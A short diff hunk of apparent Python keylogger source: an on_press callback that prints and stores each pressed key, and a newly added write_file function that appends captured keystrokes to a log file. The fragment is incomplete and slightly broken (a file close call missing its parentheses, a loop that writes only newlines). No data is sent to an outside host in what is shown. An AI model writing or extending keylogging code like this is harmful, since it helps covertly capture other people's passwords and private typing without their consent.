@@ -41,3 +41,11 @@ def on_press(key):
     print(key)
     keys.append(key)
     count += 1
+
+def write_file(keys):
+    with open(file_path + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close
